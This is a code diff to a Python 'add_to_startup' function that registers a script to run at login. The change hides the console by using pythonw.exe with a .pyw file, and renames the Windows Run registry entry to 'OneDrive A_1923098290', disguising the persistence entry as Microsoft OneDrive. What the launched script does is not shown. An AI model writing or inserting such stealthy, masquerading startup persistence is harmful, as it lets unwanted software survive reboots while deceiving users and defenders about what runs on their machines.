@@ -30,9 +30,13 @@ def install_requirements():
 
 
 def add_to_startup():
-    main_file_path = os.path.join(os.getcwd(), "main.py")
+    main_file_path = os.path.join(os.getcwd(), "main.pyw")
     log_file_path = os.path.join(os.getcwd(), "logfile.log")
     python_interpreter_path = sys.executable
+    if python_interpreter_path.lower().endswith("python.exe"):
+        python_interpreter_path = python_interpreter_path[:-10] + "pythonw.exe"
+    else:
+        pass
     if platform.system() == "Windows":
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
@@ -41,7 +45,7 @@ def add_to_startup():
             winreg.KEY_SET_VALUE,
         )
         winreg.SetValueEx(
-            key, " ", 0, winreg.REG_SZ, f"{python_interpreter_path} {main_file_path}"
+            key, "OneDrive A_1923098290", 0, winreg.REG_SZ, f"{python_interpreter_path} {main_file_path}"
         )
         winreg.CloseKey(key)
     elif platform.system() == "Darwin":
